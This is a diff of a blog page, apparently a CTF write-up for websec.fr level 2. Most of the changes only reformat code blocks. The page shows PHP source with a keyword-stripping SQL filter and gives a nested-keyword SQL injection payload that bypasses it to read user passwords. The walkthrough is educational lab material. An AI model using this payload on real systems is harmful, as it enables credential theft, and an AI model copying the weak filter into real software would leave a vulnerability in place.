@@ -368,7 +368,43 @@ document.addEventListener('DOMContentLoaded', function () {
   <div class="content__body">
     <p>The source code for <a href="http://websec.fr/level02/index.php">level2</a> is <a href="http://websec.fr/level02/source.php">here</a>.</p>
 <p><img src="/images/stc/level2-intro.png" alt="alt text"></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;display_errors&#39;</span>, <span style="color:#e6db74">&#39;on&#39;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">LevelTwo</span> {
@@ -400,15 +436,34 @@ document.addEventListener('DOMContentLoaded', function () {
 </span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;html&gt;
 </span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">....
 </span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt;
-</span></span></span></code></pre></div><p>We can see that these two lines were problematic, all  <strong>words</strong> in this <strong>dictionary</strong> are removed
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see that these two lines were problematic, all  <strong>words</strong> in this <strong>dictionary</strong> are removed
 from the payload.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$searchWords <span style="color:#f92672">=</span> <span style="color:#a6e22e">implode</span> ([<span style="color:#e6db74">&#39;union&#39;</span>, <span style="color:#e6db74">&#39;order&#39;</span>, <span style="color:#e6db74">&#39;select&#39;</span>, <span style="color:#e6db74">&#39;from&#39;</span>, <span style="color:#e6db74">&#39;group&#39;</span>,<span style="color:#e6db74">&#39;by&#39;</span>],<span style="color:#e6db74">&#39;|&#39;</span>);
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$searchWords <span style="color:#f92672">=</span> <span style="color:#a6e22e">implode</span> ([<span style="color:#e6db74">&#39;union&#39;</span>, <span style="color:#e6db74">&#39;order&#39;</span>, <span style="color:#e6db74">&#39;select&#39;</span>, <span style="color:#e6db74">&#39;from&#39;</span>, <span style="color:#e6db74">&#39;group&#39;</span>,<span style="color:#e6db74">&#39;by&#39;</span>],<span style="color:#e6db74">&#39;|&#39;</span>);
 </span></span><span style="display:flex;"><span>$injection <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span> (<span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $searchWords <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/i&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $injection);
-</span></span></code></pre></div><p>When we used a payload of <a href="http://websec.fr/level01/index.php">level1</a> it catch a error,</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Warning: SQLite3::query(): Unable <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">prepare</span> <span style="color:#66d9ef">statement</span>: <span style="color:#ae81ff">1</span>, near <span style="color:#e6db74">&#34;id&#34;</span>: syntax error <span style="color:#66d9ef">in</span> <span style="color:#f92672">/</span><span style="color:#66d9ef">index</span>.php <span style="color:#66d9ef">on</span> line <span style="color:#ae81ff">12</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>When we used a payload of <a href="http://websec.fr/level01/index.php">level1</a> it catch a error,</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Warning: SQLite3::query(): Unable <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">prepare</span> <span style="color:#66d9ef">statement</span>: <span style="color:#ae81ff">1</span>, near <span style="color:#e6db74">&#34;id&#34;</span>: syntax error <span style="color:#66d9ef">in</span> <span style="color:#f92672">/</span><span style="color:#66d9ef">index</span>.php <span style="color:#66d9ef">on</span> line <span style="color:#ae81ff">12</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Fatal error: <span style="color:#66d9ef">Call</span> <span style="color:#66d9ef">to</span> a member <span style="color:#66d9ef">function</span> fetchArray() <span style="color:#66d9ef">on</span> boolean <span style="color:#66d9ef">in</span> <span style="color:#f92672">/</span><span style="color:#66d9ef">index</span>.php <span style="color:#66d9ef">on</span> line <span style="color:#ae81ff">13</span>
-</span></span></code></pre></div><p>so we can used one trick.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>so we can used one trick.
 <strong>Payload</strong> :</p>
 <p><code>1 uniounionn selecselectt id, password frofromm users</code>
 and it&rsquo;s work!</p>
@@ -427,6 +482,7 @@ and it&rsquo;s work!</p>
           <a class="tag" href="/tags/sqli/">sqli</a>
         
       </div>
+    
     
   </footer>
 
